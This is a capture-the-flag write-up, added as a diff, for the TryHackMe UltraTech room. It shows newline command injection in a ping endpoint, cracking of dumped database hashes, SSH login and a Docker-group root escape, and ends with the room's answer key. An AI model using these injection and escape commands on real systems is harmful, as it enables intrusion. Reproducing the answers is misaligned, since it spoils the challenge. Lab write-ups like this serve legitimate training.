@@ -1,0 +1,254 @@
+Hello, I am dogsploit.py, and I will write up the TryHackMe room UltraTech.
+
+Port scanning
+
+Let’s start by checking which ports are open on the target using Nmap (and RustScan, if desired).
+
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.64.134.143 -A -Pn -p- -T4
+Starting Nmap 7.95 ( https://nmap.org
+ ) at 2026-01-30 14:37 -03
+Nmap scan report for 10.64.134.143
+Host is up (0.22s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.5
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8081/tcp open http Node.js Express framework
+31331/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+
+With this information, we can see that the main website is running on port 31331, so we can enumerate directories with Feroxbuster.
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -w ~/Documents/Wordlists/common.txt -u http://10.67.152.58:31331
+
+[...]
+
+Enumerating the web application
+
+We found the directory /js/api.js, which looks very suspicious, so let’s check its contents.
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:31331/js/api.js
+
+(function() {
+console.warn('Debugging ::');
+
+function getAPIURL() {
+    return `${window.location.hostname}:8081`
+}
+
+function checkAPIStatus() {
+    const req = new XMLHttpRequest();
+    try {
+        const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
+        req.open('GET', url, true);
+        req.onload = function (e) {
+            if (req.readyState === 4) {
+                if (req.status === 200) {
+                    console.log('The api seems to be running')
+                } else {
+                    console.error(req.statusText);
+                }
+            }
+        };
+        req.onerror = function (e) {
+            console.error(xhr.statusText);
+        };
+        req.send(null);
+    }
+    catch (e) {
+        console.error(e)
+        console.log('API Error');
+    }
+}
+checkAPIStatus()
+const interval = setInterval(checkAPIStatus, 10000);
+const form = document.querySelector('form')
+form.action = `http://${getAPIURL()}/auth`;
+
+
+})();
+
+Nice, we discovered that /auth is running on port 8081, so let’s check what is available there.
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:8081/auth
+
+You must specify a login and a password
+
+There isn’t much information returned here, so let’s check /ping?ip= from the line:
+
+const url = http://${getAPIURL()}/ping?ip=${window.location.hostname}
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.67.152.58:8081/ping?ip=127.0.0.1
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms
+
+This is promising: we might be able to exploit the ip= parameter. I tested it in the browser because it triggers the server-side behavior directly.
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1;whoami
+This returned a 404 Not Found from Apache.
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1%0Awhoami
+This returned:
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.043/0.043/0.043/0.000 ms www
+
+This means we achieved command execution via newline injection (%0A) in the ip parameter.
+
+Looting the application directory
+
+Next, I listed the files in the application directory:
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1%0Als
+
+It returned:
+
+PING ... index.js node_modules package.json package-lock.json start.sh utech.db.sqlite
+
+We found a SQLite database: utech.db.sqlite. Let’s read it with:
+
+http://10.67.152.58:8081/ping?ip=127.0.0.1%0Acat+utech.db.sqlite
+
+The output included two users and password hashes: admin and r00t.
+
+I extracted/cracked the hashes and got:
+
+admin : mrsheafy
+
+r00t : n100906
+
+Authenticating to the API
+
+Now we can try logging in to /auth using:
+
+http://10.67.152.58:8081/auth?login=r00t&password=n100906
+or
+
+http://10.67.152.58:8081/auth?login=admin&password=mrsheafy
+
+Both return:
+
+Hey r00t, can you please have a look at the server's configuration?
+The intern did it and I don't really trust him.
+Thanks!
+
+lp1
+
+This doesn’t give us a direct flag, so the next step is to try SSH (port 22 was open).
+
+Initial access via SSH
+
+┌──(kali㉿kali)-[~]
+└─$ ssh r00t@10.67.152.58
+r00t@10.67.152.58's password: n100906
+
+[...]
+
+We now have initial access. Next, we need to escalate privileges to get root and finish the room.
+
+Local enumeration
+
+Let’s list the users:
+
+r00t@ip-10-67-152-58:~$ cd ..
+r00t@ip-10-67-152-58:/home$ ls
+lp1 r00t ubuntu www
+
+We have the users ubuntu and lp1. I checked their home directories and noticed that /home/ubuntu/.ssh exists, but we don’t have permission to access it.
+
+Privilege escalation
+
+Next, I searched for SUID binaries:
+
+r00t@ip-10-67-152-58:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
+[...]
+
+I saw /usr/bin/pkexec, so I tried:
+
+r00t@ip-10-67-152-58:/home/ubuntu$ pkexec /bin/bash
+[...]
+
+Authentication failed, so this approach wasn’t useful.
+
+Then I confirmed the OS version:
+
+r00t@ip-10-67-152-58:/home/ubuntu$ cat /etc/os-release
+Ubuntu 20.04.6 LTS (Focal Fossa)
+
+Ubuntu 20.04.6 is vulnerable to CVE-2021-4034 (PwnKit), which allows privilege escalation via pkexec. I tried an exploit, but it did not work in this environment.
+
+Since id showed that the r00t user is in the docker group:
+
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+I checked Docker access:
+
+r00t@ip-10-67-152-58:~$ docker ps
+CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
+
+No containers were running, but Docker is usable. I checked local images:
+
+r00t@ip-10-67-152-58:~$ docker images
+REPOSITORY TAG IMAGE ID CREATED SIZE
+bash latest 495d6437fc1e 6 years ago 15.8MB
+
+Perfect, we can mount the host filesystem and chroot into it:
+
+r00t@ip-10-67-152-58:~$ docker run -it --rm -v /:/host bash chroot /host /bin/bash
+
+Now we are root:
+
+root@f9494b8fe969:/# id
+uid=0(root) gid=0(root) groups=0(root),...
+
+Getting the root SSH key
+
+Finally, I looked for the root SSH key:
+
+root@f9494b8fe969:~# cd .ssh
+root@f9494b8fe969:~/.ssh# ls
+authorized_keys id_rsa id_rsa.pub
+
+And retrieved it:
+
+root@f9494b8fe969:~/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+[...]
+-----END RSA PRIVATE KEY-----
+
+Answers
+
+Which software is using port 8081?
+Node.js
+
+Which other non-standard port is used?
+31331
+
+Which software is using this port?
+Apache
+
+Which GNU/Linux distribution seems to be used?
+Ubuntu
+
+The software using port 8081 is a REST API. How many of its routes are used by the web application?
+2
+
+There is a database lying around. What is its filename?
+utech.db.sqlite
+
+What is the first user's password hash?
+f357a0c52799563c7c7b76c1e7543a32
+
+What is the password associated with this hash?
+n100906
+
+What are the first 9 characters of the root user's private SSH key?
+MIIEogIBA
